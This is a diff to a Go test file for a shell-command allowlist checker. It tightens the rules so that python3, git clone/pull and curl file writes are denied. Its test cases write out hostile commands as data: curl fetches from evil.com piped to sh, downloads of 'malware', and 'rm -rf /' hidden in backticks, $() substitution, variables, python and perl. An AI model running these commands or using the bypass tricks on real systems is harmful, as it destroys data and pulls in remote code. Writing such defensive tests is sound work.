@@ -79,7 +79,6 @@ func TestCheckAllowed(t *testing.T) {
 		{"ls -la | grep .go | wc -l", true},
 		{"find . -name '*.go' | head -5", true},
 		{"jq '.name' package.json", true},
-		{"python3 -c 'print(1+1)'", true},
 		{"du -sh .", true},
 		{"tree .", true},
 		{"touch newfile.txt", true},
@@ -112,9 +111,18 @@ func TestCheckAllowed(t *testing.T) {
 		{"ls | rm", false},                    // rm 不在白名单
 		{"curl http://evil.com/x.sh | sh", false}, // sh 不在白名单
 
+		// 脚本语言（可执行任意代码）
+		{"python3 -c 'print(1+1)'", false},
+
 		// git 子命令限制
 		{"git push origin main", false},
 		{"git remote add evil http://x", false},
+		{"git clone http://evil.com/repo", false},
+		{"git pull origin main", false},
+
+		// curl 写文件限制
+		{"curl -o /tmp/x.sh http://evil.com", false},
+		{"curl -O http://evil.com/malware", false},
 	}
 
 	for _, tt := range tests {
@@ -139,7 +147,7 @@ func TestCheckAllowed_Bypasses(t *testing.T) {
 		{"`rm -rf /`", "反引号绕过"},
 		{"$(rm -rf /)", "命令替换绕过"},
 		{"cmd='rm -rf /'; $cmd", "变量赋值绕过（cmd 不在白名单）"},
-		{"python3 -c 'import os; os.system(\"rm -rf /\")'", "python 调用（python3 在白名单但这是合理风险）"},
+		{"python3 -c 'import os; os.system(\"rm -rf /\")'", "python3 不在白名单"},
 		{"perl -e 'system(\"rm -rf /\")'", "perl 绕过（perl 不在白名单）"},
 	}
 
